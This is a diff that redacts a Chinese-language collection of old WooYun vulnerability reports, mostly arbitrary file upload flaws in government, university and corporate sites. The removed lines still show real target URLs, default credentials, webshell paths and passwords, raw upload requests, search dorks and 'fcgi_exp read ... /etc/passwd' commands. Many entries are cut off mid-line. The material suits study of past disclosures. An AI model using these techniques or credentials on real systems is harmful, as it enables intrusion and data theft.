-**详情**: 1、 JBR-CMS 5.0 FileList.aspx任意目录遍历：除了这个帖子WooYun: JBR-CMS Version:V5.0 直接越权添加管理员与任意目录遍历漏洞里面说的两个之外，无意间发现还有一个FileList.aspx，列出来的功能更详细，还可以随意删除文件http://mba.znufe.edu.cn/AdminManage/FileManagement/FileList.aspx?dir=D:\www.znmba.com\web_new\Upload\HtmlEditor\file\asp.asp2、中南财经政法大学数据库备份可下载：http://mba.znufe.edu.cn/2013-7-5.rarhttp://mba.znufe.edu.cn/2013-1-31.rarhttp://mba.znufe.edu.cn/upfile.rarIIS 6.0解析漏洞
+**详情**: 1、 JBR-CMS 5.0 FileList.aspx任意目录遍历：除了这个帖子WooYun: JBR-CMS Version:V5.0 直接越权添加管理员与任意目录遍历漏洞里面说的两个之外，无意间发现还有一个FileList.aspx，列出来的功能更详细，还可以随意删除文件https://example.com/[已脱敏] 6.0解析漏洞
 
 **POC**: (见原文)
 
@@ -8716,9 +8716,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 同济大学任意文件上传http://202.120.189.171/register   上传头像处  抓包改后缀上传  可上传任意文件
+**详情**: 同济大学任意文件上传http://[IP已脱敏]   上传头像处  抓包改后缀上传  可上传任意文件
 
-**POC**: 以shell   请自行删除 http://202.120.189.171/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/user/logo/823.jsp
+**POC**: 以shell   请自行删除 http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -8740,7 +8740,7 @@
 
 **详情**: ..见证明
 
-**POC**: http://223.4.9.110//Plugin/Upload/UploadTongYong.aspx任意上传点，可上传aspx直接上传aspx
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -8760,7 +8760,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 箭头指向位置得到调用的地址直接未授权访问不好意思测试了几个小文件，请维护修补漏洞的时候删除吧。文件上传后，得到的地址是另外一台服务器的地址，没有访问权限。这个可以添加和修改，可以任意修改。这个弱口令：http://182.139.134.42/ghzx/    admin   admin
+**详情**: 箭头指向位置得到调用的地址直接未授权访问不好意思测试了几个小文件，请维护修补漏洞的时候删除吧。文件上传后，得到的地址是另外一台服务器的地址，没有访问权限。这个可以添加和修改，可以任意修改。这个弱口令：http://[IP已脱敏]    admin   admin
 
 **POC**: (见原文)
 
@@ -8782,7 +8782,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://qr.hisense.com/海信集团二维码平台  存在弱口令admin  111111登陆以后可以看到各种内部二维码借口和内部的素材是不是可以把我的收款二维码链接放上去，然后发布出去？？？？ YY一下~~~~~素材发布出，新建素材，选择传文件POST /homehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file/0 HTTP/1.1Host: qr.hisense.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: 
+**详情**: https://example.com/[已脱敏]  存在弱口令admin  111111登陆以后可以看到各种内部二维码借口和内部的素材是不是可以把我的收款二维码链接放上去，然后发布出去？？？？ YY一下~~~~~素材发布出，新建素材，选择传文件POST /homehttps://example.com/[已脱敏] HTTP/1.1Host: qr.hisense.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: 
 
 **POC**: (见原文)
 
@@ -8804,7 +8804,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这两个页面直接爆出了绝对路径http://www.7daysinn.cn/product_intro.htmlhttp://www.7daysinn.cn/cooperate.html呃为啥都在根域一个是linux路径一个是windows的求解下面两个fckeditor的二次上传漏洞 目测被万人骑了。。。http://in.7daysinn.cn/fckeditor/editor/filemanager/connectors/test.html#http://partner.7daysinn.cn/FCKeditor/editor/filemanager/connectors/test.html#小弟测试了一下上传漏洞虽然能写入，貌似服务器做个限制或者有什么waf 导致马儿不能正常运行。不过还是补上的比较好
+**详情**: 这两个页面直接爆出了绝对路径https://example.com/[已脱敏] 目测被万人骑了。。。https://example.com/[已脱敏] 导致马儿不能正常运行。不过还是补上的比较好
 
 **POC**: (见原文)
 
@@ -8848,7 +8848,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 还是所有用户的登录信息：http://www.ssapchina.com/api/log.txt编辑器：此处没什么危害，算是附带提一下，只是上传的文件可以被下载，目录已经禁止脚本执行了，上传等不能跨目录http://www.ssapchina.com/admin/ckfinder/ckfinder.html?action=js&f
+**详情**: 还是所有用户的登录信息：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8892,7 +8892,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在http://www.zjbtv.com/注册用户，然后在爆料中心上传，通过合成图片马，再用burp截包修改后缀名上传！其实之前上传试了很多次！原来菜刀的问题！
+**详情**: 在https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8914,9 +8914,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <form id="frmUpload" enctype="multipart/form-data" action="http://www.zixing.gov.cn/comm_front/email/uploadImageFile_do.jsp" method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUpload" type="submit" value="Upload"></form>构造上传jsp大马
+**详情**: <form id="frmUpload" enctype="multipart/form-data" action="https://example.com/[已脱敏]" method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUpload" type="submit" value="Upload"></form>构造上传jsp大马
 
-**POC**: http://www.zixing.gov.cn/comm/common/appendix/20130821114005578.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8936,7 +8936,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 学事通偶然看到的一个站，危害之一是可以利用该系统给学生家长群发诈骗短信http://www.njxt.net:800060.190.202.51未授权访问http://www.njxt.net:8000/scmanage/index.aspx?sid=22&uname=0022029http://www.njxt.net:8000/scmanage/index.aspx?sid=52&uname=0193001http://www.njxt.net:8000/scmanage/index.aspx?sid=166&uname=0104060爆破学校ID,403则存在http://www.njxt.net:8000/image/studentimg/166/爆破学校账号应该也行，7位数，这里没有试任意文件下载http://www.njxt.net:8000/ashx/download.ash
+**详情**: 学事通偶然看到的一个站，危害之一是可以利用该系统给学生家长群发诈骗短信https://example.com/[已脱敏]
 
 **POC**: 从图片文件夹路径看，大概有800个学校，一个学校几百学生，总人数还是很可观的最后连接数据库看看：没有进一步看，SHELL请自行删除。
 
@@ -8958,9 +8958,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 话说一同学在你们学校读书，然后没事的时候进去了下他学校官网看了下。。然后随便点了个办公系统。。。看到aspx的。然后扫了下。发现fck编辑器一枚。。http://218.193.224.21/fckeditor/editor/filemanager/browser/default/connectors/test.html直接上传aspx大马。。http://218.193.224.21/UserFiles/File/aspx1.aspx  密码admin
+**详情**: 话说一同学在你们学校读书，然后没事的时候进去了下他学校官网看了下。。然后随便点了个办公系统。。。看到aspx的。然后扫了下。发现fck编辑器一枚。。http://[IP已脱敏]  密码admin
 
-**POC**: img src="https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201409/20142845efc41836fa7cc39c1803cdc4c03e0da4.png" alt="4.png" />我就不做死。。<
+**POC**: img src="https://example.com/[已脱敏]" alt="4.png" />我就不做死。。<
 
 **绕过**: 直接利用
 
@@ -8986,7 +8986,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 虽然回复都是“非常感谢您对TOM在线的帮助，我们会尽快做出处理。我们为支持TOM在线的发布者创建了一个技术交流QQ群：，希望您以及更多的成员加入，大家共同交流。”但是还是提交一下吧”你们比我更专业
+**修复**: 虽然回复都是“非常感谢您对TOM在线的帮助，我们会尽快做出处理。我们为支持TOM在线的发布者创建了一个技术交流某互联网公司群：，希望您以及更多的成员加入，大家共同交流。”但是还是提交一下吧”你们比我更专业
 ---
 
 ---
@@ -9024,7 +9024,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://wooyun.org/bugs/wooyun-2010-041330根据这个漏洞，http://59.46.220.76/common/.svn/text-base/page_macro.ftl.svn-base发现SVN依旧可以看到源码。然后看到有个fck。嗯。FCK+jsp.
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9046,9 +9046,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标地址：http://bs.qwb.sh.gov.cn/qwb_inter/pages/T_QWB_CHIEFMAIL/new_edit.jspip地址：同jk.qwb.sh.gov.cn，均为211.152.36.83问题原因：fck编辑器不正确配置fck地址：http://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../以上文件遍历
+**详情**: 目标地址：https://example.com/[已脱敏]
 
-**POC**: 文件上传：http://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector需要上传jspx文件类型，jsp有跳转，跨目录传未尝试一句话地址：http://jk.qwb.sh.gov.cn/qwb_inter/UserFiles/Im
+**POC**: 文件上传：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9114,7 +9114,7 @@
 
 **详情**: 首先注册一个用户然后在用户中心找到上传漏洞然后传个txt吧走人你看到了的,asp的文件夹都有了,后面就不用说了
 
-**POC**: TXT地址;http://www.eng24.com/user_center/answer/images/file/1.txt
+**POC**: TXT地址;https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9122,8 +9122,8 @@
 ---
 
 ---
-### [wooyun-2014-051159] 中国移动MM应用引擎任意文件上传
-**厂商**: 中国移动 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2014-051159] 某运营商MM应用引擎任意文件上传
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -9136,7 +9136,7 @@
 
 **详情**: 任意注册个账号，上传php木马即可查看。只能查看其他开发者源码，暂无修改权限，不知能否再提权。
 
-**POC**: manger.mmapp.cn/PHPJackal.php服务器信息：泄露的二级域名目录，以前2字母为目录：http://1.manger.mmapp.cn/PHPJackal.php?seC=fm&workingdiR=/opt/omae/php_web_root可查看源码:http://1.manger.mmapp.cn/PHPJackal.php?seC=fm&workingdiR=/opt/omae/php_web_root/ma/maro/1http://1.manger.mmapp.cn/PHPJackal.php?seC=edit&filE=install.php&working
+**POC**: manger.mmapp.cn/PHPJackal.php服务器信息：泄露的二级域名目录，以前2字母为目录：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9145,7 +9145,7 @@
 
 ---
 ### [wooyun-2012-06675] 用户软件无法提交上传
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 小小的缺陷
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 小小的缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -9178,9 +9178,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我只是想要个邀请码。。。后台弱口令http://cashtask.com/admin/login.phpadminadmin进入后台后不需验证旧密码可以直接修改密码把原密码给覆盖掉看到一些下载站点上面RAICO这套程序也有4000多个下载次数。。问题如下ewebeditor的漏洞就不多说了。直接输入地址进后台。。。这里可以直接看到服务器配置。。。后台可以修改文件类型直接上传。。可以删除文件。。没测试。。URLhttp://cashtask.com/editor/admin/main.phphttp://cashtask.com/editor/admin/default.php另外。。。支付方面也存在问题。。用hidden传值不经过验证。。chrome下直接修改金额发送过去。。。。
+**详情**: 我只是想要个邀请码。。。后台弱口令https://example.com/[已脱敏]
 
-**POC**: 后台弱口令http://cashtask.com/admin/login.phpadminadmin进入后台后不需验证旧密码可以直接修改密码把原密码给覆盖掉URLhttp://cashtask.com/editor/admin/main.phphttp://cashtask.com/editor/admin/default.php
+**POC**: 后台弱口令https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9200,13 +9200,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参考GaRY大牛在zone发的帖子；http://zone.wooyun.org/content/1060找了几个机器试了试，试了好多机器都没有成功，于是拿起perl写了个多线程的小工具；第一个遭殃的鲜果网的几个机器Wed Sep 19 02:28:03 CST 2012   211.151.83.10Wed Sep 19 02:28:03 CST 2012   211.151.83.7Wed Sep 19 02:28:03 CST 2012   211.151.83.11Wed Sep 19 02:28:03 CST 2012   211.151.83.15
+**详情**: 参考GaRY大牛在zone发的帖子；https://example.com/[已脱敏] Sep 19 02:28:03 CST 2012   [IP已脱敏]Wed Sep 19 02:28:03 CST 2012   [IP已脱敏]Wed Sep 19 02:28:03 CST 2012   [IP已脱敏]Wed Sep 19 02:28:03 CST 2012   [IP已脱敏]
 
-**POC**: ./fcgi_exp read 211.151.83.10 8008 /etc/passwd./fcgi_exp read 211.151.83.7 8008 /etc/passwd./fcgi_exp read 211.151.83.11 8008 /etc/passwd./fcgi_exp read 211.151.83.15 8008 /etc/passwd工具我就不打包了，自己去zone找工具复现下；
+**POC**: ./fcgi_exp read [IP已脱敏] 8008 /etc/passwd./fcgi_exp read [IP已脱敏] 8008 /etc/passwd./fcgi_exp read [IP已脱敏] 8008 /etc/passwd./fcgi_exp read [IP已脱敏] 8008 /etc/passwd工具我就不打包了，自己去zone找工具复现下；
 
 **绕过**: 直接利用
 
-**修复**: 参照http://zone.wooyun.org/content/1060应该都懂滴；
+**修复**: 参照https://example.com/[已脱敏]
 ---
 
 ---
@@ -9224,7 +9224,7 @@
 
 **详情**: 
 
-**POC**: http://www.sdia.cn  FTP用户名：admin 密码admin
+**POC**: https://example.com/[已脱敏]  FTP用户名：admin 密码admin
 
 **绕过**: 直接利用
 
@@ -9244,7 +9244,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过嗅探发现一处畅游的天兵系统http://180.149.157.110/home/App但是这个系统可利用的东西比较少,系统上次看和这次变化比较大,看样子新加了不少东西在翻找无果后看到了一个页面http://180.149.157.110/home/App就是他的APP下载页面通过对二维码的解码发现地址http://cyn.changyou.com/cyouApp/versionAdmin/downloadPage.shtml看到地址本能反映就是在后台里面果不其然访问http://cyn.changyou.com/cyouApp/是畅游的内容管理系统然后直接尝试弱密码admin admin好简单,而且没有验证码  爆破都不是难事进入后台权限比较大 可以重置很多密码...这里我就不错尝试,不能影响业务.随后发现有APP的设备管理,可以上传文件,并且可以上传任意文件随后就找了下注入发现查询
+**详情**: 通过嗅探发现一处畅游的天兵系统http://[IP已脱敏] admin好简单,而且没有验证码  爆破都不是难事进入后台权限比较大 可以重置很多密码...这里我就不错尝试,不能影响业务.随后发现有APP的设备管理,可以上传文件,并且可以上传任意文件随后就找了下注入发现查询
 
 **POC**: 如上
 
@@ -9290,7 +9290,7 @@
 
 **详情**: trs 上传漏洞获取到服务器权限后查看root的history发现mount了主站
 
-**POC**: 上传pocPOST http://wcm.fmprc.gov.cn/wcm/services/trs:templateservicefacade HTTP/1.0SOAPAction: ""Content-Type: text/xml<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:x
+**POC**: 上传pocPOST https://example.com/[已脱敏] HTTP/1.0SOAPAction: ""Content-Type: text/xml<SOAP-ENV:Envelope xmlns:SOAP-ENV="https://example.com/[已脱敏]" xmlns:soap="https://example.com/[已脱敏]"  xmlns:xsd="https://example.com/[已脱敏]"  xmlns:x
 
 **绕过**: 直接利用
 
@@ -9321,7 +9321,7 @@
 
 ---
 ### [wooyun-2015-0114100] 翼机通省平台另一站点存在任意文件上传漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -9332,9 +9332,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在之前提交的翼机通省平台漏洞中，有一个链接，地址是http://125.88.109.71/login.jspx，这是一个存放历史数据的平台帐号与http://14.146.224.121/login.jspx不通用但系统是一样的，我就想试试上传点是否有做权限控制
+**详情**: 在之前提交的翼机通省平台漏洞中，有一个链接，地址是http://[IP已脱敏]
 
-**POC**: 将之前漏洞的数据包ip地址替换POST http://125.88.109.71/datamgr/imageupload!upload.jspx HTTP/1.1Host: 125.88.109.71Connection: keep-aliveContent-Length: 10383Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://125.88.109.71User-Agent: Mozilla/5.0
+**POC**: 将之前漏洞的数据包ip地址替换POST http://[IP已脱敏] HTTP/1.1Host: [IP已脱敏]Connection: keep-aliveContent-Length: 10383Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://[IP已脱敏]User-Agent: Mozilla/5.0
 
 **绕过**: 直接利用
 
@@ -9354,7 +9354,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 继续挖掘之前发布过的漏洞WooYun: 某通用程序任意目录遍历及文件上传导致任意代码执行（影响全国各省）发现其他两处任意文件上传点--------------------------------------------------------百度dork: inurl:/ycportal影响范围：全国各省市地区烟草专卖局及少数GOV站点--------------------------------------------------------0x00:测试文件内容<%out.print("just4test....From WooYun.Org");%>0x01:第一处上传点说明：这里没什么可说的，直接打开页面 ycportal/jsp/forupload.jsp，上传jsp文件即可。访问路径为 upload/images/itemimage/null.jsp案例：http://www
+**详情**: 继续挖掘之前发布过的漏洞WooYun: 某通用程序任意目录遍历及文件上传导致任意代码执行（影响全国各省）发现其他两处任意文件上传点--------------------------------------------------------某搜索引擎dork: inurl:/ycportal影响范围：全国各省市地区烟草专卖局及少数GOV站点--------------------------------------------------------0x00:测试文件内容<%out.print("just4test....From WooYun.Org");%>0x01:第一处上传点说明：这里没什么可说的，直接打开页面 ycportal/jsp/forupload.jsp，上传jsp文件即可。访问路径为 upload/images/itemimage/null.jsp案例：http://www
 
 **POC**: (见原文)
 
@@ -9376,7 +9376,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 蜘蛛网电影分站jboss服务器配置不当导致沦陷漏洞地址：http://test.spider.com.cn:8060/jmx-console/漏洞利用过程如下：看看是什么权限用户C盘的内容
+**详情**: 蜘蛛网电影分站jboss服务器配置不当导致沦陷漏洞地址：https://example.com/[已脱敏]
 
 **POC**: 漏洞证明
 
@@ -9386,8 +9386,8 @@
 ---
 
 ---
-### [wooyun-2012-04034] 中国移动天津10086很好玩啊= =
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2012-04034] 某运营商天津10086很好玩啊= =
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 上传功能
 
@@ -9422,7 +9422,7 @@
 
 **详情**: 之前大牛发的洞：WooYun: 4R-IT管控系统存在通用性远程代码执行上一个漏洞任意文件下载的漏洞：WooYun: 某通用型IT管控系统存在任意文件下载漏洞这次还有一个点可以直接上传任意类型的文件
 
-**POC**: 漏洞点：http://4r.xinjingxiang.com/common/upload.jsp部分情况下可以直接上传并且回显路径：此时可以直接用菜刀连接：如果上传JSP文件出现错误，如下图：我们可以用简单的猜解的方法第一个页面放一张正常的jpg图片，第二个页面放我们的jsp文件先上传一个正常的jpg图片，然后马上去上传第二个页面的jsp文件，如果发现上传按钮点不了，就直接点路径那，然后回车就好。然后马上去看正常的jpg图片的文件名：http://119.145.128.106:88https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload//1
+**POC**: 漏洞点：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9464,9 +9464,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 住哪联盟 FCK编辑器文件上传漏洞可致站点沦陷！http://union.zhuna.cn/question/master/FCKeditor/editor/filemanager/connectors/test.html直接上传asp一句话文件test.asp;.jpg，发现上传成功后的文件后缀变成了.asp;“菜刀”连接之：点到为止，未进一步深入...
+**详情**: 住哪联盟 FCK编辑器文件上传漏洞可致站点沦陷！https://example.com/[已脱敏]
 
-**POC**: 另：广告内容管理后台无需登录可直接访问（建议进行认证）：http://union.zhuna.cn/systemmanager/根目录下多个压缩文件可被直接下载(建议删除)：
+**POC**: 另：广告内容管理后台无需登录可直接访问（建议进行认证）：https://example.com/[已脱敏])：
 
 **绕过**: 直接利用
 
@@ -9486,7 +9486,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.chinanetwork.com.cn/w8/pages/sys/annone.aspx?id=32bf330e-f925-4336-a625-68bd5dffc80b右侧添加附件可上传任意文件，用fiddler抓服务器响应包就可以获取到上传文件路径
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9508,7 +9508,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.zycms.cn/zf/upfile.asp此为演示站点的上传脚本路径，未做任何过滤与访问验证，用神器明小子直接UP了一个asp文件。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9530,9 +9530,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://pl-lf.gicp.net:3535/picclife.asp先来个未授权访问http://pl-lf.gicp.net:3535/1111.asp大量保单关键是可以按日期查询把时间间隔拉到2008年1月1日2663页，每页50条2663*50=133150条记录
+**详情**: 地址：https://example.com/[已脱敏]
 
-**POC**: 2#目录浏览权限未关http://pl-lf.gicp.net:3535/inc/http://pl-lf.gicp.net:3535https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/http://pl-lf.gicp.net:3535/images/3#文件上传http://pl-lf.gicp.net:3535/upload.asp我是直接抓包改后缀上传路径在http://pl-lf.gicp.net:3535https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/wooyun.a
+**POC**: 2#目录浏览权限未关https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9552,7 +9552,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 南京南软开发的一套专门用于高校门户信息系统的CMS存在任意文件上传漏洞，可导致上传任意文件。Upload bug:/web_admin/ftb.imagegallery.aspx  上传伪装的图片文件可导致任意文件上传互联网自动采集案例5枚：http://gschool.hebmu.edu.cn/web_admin/ftb.imagegallery.aspxhttp://yjs.xzmc.edu.cn/web_admin/ftb.imagegallery.aspxhttp://yjshb.depart.hebust.edu.cn/web_admin/ftb.imagegallery.aspxhttp://gr.besti.edu.cn/web_admin/ftb.imagegallery.aspxhttp://yjs.cdutcm.edu.cn/web_admin/ftb.imagegal
+**详情**: 南京南软开发的一套专门用于高校门户信息系统的CMS存在任意文件上传漏洞，可导致上传任意文件。Upload bug:/web_admin/ftb.imagegallery.aspx  上传伪装的图片文件可导致任意文件上传互联网自动采集案例5枚：https://example.com/[已脱敏]
 
 **POC**: 以其中一个案例进行漏洞安全测试，此漏洞危害非常大，请不要模仿下面方法进行非法入侵，否则后果自负！上传一个图片二进制形式合成的shell，如果该伪装的shell不是图片合成的，可能会提示”内存不足“，选择为jpg格式上传，上传的时候拦截数据包。拦截数据包修改文件的后缀名提交之后便返回了文件名：
 
@@ -9574,7 +9574,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 资阳某银行网站存在严重的编辑器漏洞 再加上存在IIS6解析漏洞 导致上传图片马  直接沦陷全站  权限强大 客户信息可能容易泄漏 还是银行这种特殊的网站 谢绝查水表哦http://www.yjrcb.cn/fckeditor/editor/fckeditor.html
+**详情**: 资阳某银行网站存在严重的编辑器漏洞 再加上存在IIS6解析漏洞 导致上传图片马  直接沦陷全站  权限强大 客户信息可能容易泄漏 还是银行这种特殊的网站 谢绝查水表哦https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9596,9 +9596,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 开发公司： 黑龙江海康软件工程有限公司 （http://www.highcom.com.cn）程序名称： 海康政务信息门户系统（GIP）漏洞类型： 任意文件上传漏洞文件： gip/FCKeditor/editor/filemanager/browser/default/browser.html是否需要登录： 不需要利用方式：直接上传jsp木马，无任何限制影响版本：GIP4、GIP4.5、GIP4.6 通杀关键字：google: intitle:GIP4 inurl:gipinurl:/gip/app/影响用户：http://www.hlsafety.gov.cn:8080/gip/FCKeditor/editor/filemanager/browser/default/browser.html?webSiteName=drbt&webSiteId=40287d4619c5fc0c0119c
+**详情**: 开发公司： 黑龙江海康软件工程有限公司 （https://example.com/[已脱敏] 海康政务信息门户系统（GIP）漏洞类型： 任意文件上传漏洞文件： gip/FCKeditor/editor/filemanager/browser/default/browser.html是否需要登录： 不需要利用方式：直接上传jsp木马，无任何限制影响版本：GIP4、GIP4.5、GIP4.6 通杀关键字：google: intitle:GIP4 inurl:gipinurl:/gip/app/影响用户：https://example.com/[已脱敏]
 
-**POC**: 实例演示：###1：http://www.hlsafety.gov.cn:8080/gip/FCKeditor/editor/filemanager/browser/default/browser.html?webSiteName=drbt&webSiteId=40287d4619c5fc0c0119c60a6de50001&Type=Image&Connector=connectors/jsp/connector###2:黑龙江老干部活动中心http://www.hljelder.com:8001/gip/FCKeditor/editor/filemanager/browser/defaul
+**POC**: 实例演示：###1：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9618,7 +9618,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 知道你们的管理已经删除了比较明显的木马和菠菜文件但是没有删除的呢  如下 百度搜索site:blog.zzedu.net.cn 娱乐城根据百度快照时间，可以推算出网站被入侵的大概时间是在2014-9月----2014-10月之间入侵的方式FCK上传和网站功能缺陷
+**详情**: 知道你们的管理已经删除了比较明显的木马和菠菜文件但是没有删除的呢  如下 某搜索引擎搜索site:blog.zzedu.net.cn 娱乐城根据某搜索引擎快照时间，可以推算出网站被入侵的大概时间是在2014-9月----2014-10月之间入侵的方式FCK上传和网站功能缺陷
 
 **POC**: (见原文)
 
@@ -9642,7 +9642,7 @@
 
 **详情**: 网站信息发布处存在不严格的过滤上传，利用账户密码登陆管理后台上传ASPX脚本执行。
 
-**POC**: 登陆http://ztb.epoint.com.cn:8090/bzbztb5_Demo/login_usb.aspx用户名admin密码11111进入保存为草稿箱使用burpsuite拦截修改cc.aspx.jpg为cc.aspx即可最后上shell我发现好多没有过滤的地方啊。
+**POC**: 登陆https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9706,7 +9706,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先证明服务器是人民日报的：菊花：讲文明树新风活动：http://www.peoplecity.cn/pmgyggds/index.action绚丽甘肃活动：http://www.peoplecity.cn/pmgssyds/index.action
+**详情**: 首先证明服务器是人民日报的：菊花：讲文明树新风活动：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9730,7 +9730,7 @@
 
 **详情**: 上传漏洞：**.**.**.**:9099/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx可以直接上传，并利用二次上传漏洞构造双拓展名传马：**.**.**.**:8088/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx
 
-**POC**: 多个市政府用这个系统，影响的肯定不止一个系统：GETSHELL事例：**.**.**.**:9099/imageshttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/image/1.asp;(1).gif这种系统一旦出现高危漏洞影响的可就是整个政府部门所有内部系统了。。。这几个G级别的数据库村的可都是全市人民的信息。其他例子：**.**.**.**:9099/**.**.**.**:9099/Login.aspx**.**.**.**:8088**.**.**.**:9099/**.**.**.**:9099/http://**.**.*
+**POC**: 多个市政府用这个系统，影响的肯定不止一个系统：GETSHELL事例：**.**.**.**:9099/imageshttps://example.com/[已脱敏]).gif这种系统一旦出现高危漏洞影响的可就是整个政府部门所有内部系统了。。。这几个G级别的数据库村的可都是全市人民的信息。其他例子：**.**.**.**:9099/**.**.**.**:9099/Login.aspx**.**.**.**:8088**.**.**.**:9099/**.**.**.**:9099/http://**.**.*
 
 **绕过**: 直接利用
 
@@ -9752,7 +9752,7 @@
 
 **详情**: 1.上传时表单提交只做了JS验证(FireBUG改下就绕过了)2.上传文件加入GIF头后直接上传为PHP的文件(不知道是否有做mime.type验证)
 
-**POC**: http://news.4399.com/show/index.php?s=showme登录状态下..
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -9774,7 +9774,7 @@
 
 **详情**: 淮北市司法局任意文件上传漏洞
 
-**POC**: http://www.hbpfw.gov.cn/admin/module/3/file.php?filename=CPTP&id=79可惜是上传到另外一个服务器上
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9794,7 +9794,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
